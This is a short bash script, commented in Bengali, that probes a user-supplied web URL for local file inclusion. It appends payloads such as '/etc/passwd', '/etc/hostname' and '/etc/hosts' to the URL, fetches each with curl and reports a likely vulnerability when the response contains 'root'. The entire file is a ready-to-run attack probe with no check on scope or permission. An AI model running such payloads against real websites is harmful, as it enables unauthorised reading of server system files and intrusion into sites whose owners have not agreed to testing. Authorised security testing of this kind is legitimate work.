#!/bin/bash

# ওয়েবসাইট URL ইনপুট নিন
echo "Enter Website URL for LFI Test (e.g., http://example.com/index.php?page=):"
read URL

# LFI পে-লোড
LFI_PAYLOADS=("/etc/passwd" "/etc/hostname" "/etc/hosts")

for payload in "${LFI_PAYLOADS[@]}"
do
    # প্রতিটি প্যারামিটার দিয়ে টেস্ট করা
    TEST_URL="${URL}${payload}"
    RESPONSE=$(curl -s $TEST_URL)

    # যদি ফাইল কনটেন্ট দেখা যায়, LFI ভ্যালনারেবিলিটি থাকতে পারে
    if echo $RESPONSE | grep -q "root"; then
        echo "[+] Potential LFI vulnerability detected with payload: $payload"
    else
        echo "[-] No LFI vulnerability detected with payload: $payload"
    fi
done
